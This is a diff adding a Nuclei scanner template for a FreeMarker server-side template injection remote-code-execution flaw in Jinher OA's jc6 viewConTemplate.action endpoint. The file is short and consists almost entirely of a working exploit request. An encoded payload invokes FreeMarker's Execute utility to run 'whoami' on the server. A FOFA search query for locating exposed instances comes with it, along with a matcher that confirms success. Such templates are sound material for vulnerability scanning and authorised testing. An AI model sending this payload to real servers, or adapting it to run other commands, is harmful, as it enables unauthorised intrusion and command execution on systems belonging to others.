@@ -1,0 +1,29 @@
+id: jinher-oa-jc6-viewConTemplate-action-ssti-rce
+
+info:
+  name: 金和 OA jc6 viewConTemplate.action - FreeMarker ssti
+  author: cnaq
+  severity: critical
+  description: 
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E9%87%91%E5%92%8COA_jc6_viewConTemplate.action%E5%AD%98%E5%9C%A8FreeMarker%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    veified: true
+    max-request: 1
+    fofa-query: body="/jc6/platform/sys/login" || body="JHSoft.Web.AddMenu" || app="金和网络-金和OA" || "JC6金和协同管理平台"
+  tags: jinher,ssti,rce,oa
+
+http:
+  - raw:
+      - |
+        POST /jc6/platform/portalwb/portalwb-con-template!viewConTemplate.action HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip
+        Content-Type: application/x-www-form-urlencoded
+
+        moduId=1&code=%253Cclob%253E%2524%257B%2522freemarker.template.utility.Execute%2522%253Fnew%28%29%28%2522whoami%2522%29%257D%253C%252Fclob%253E&uuid=1
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,'<clob>')
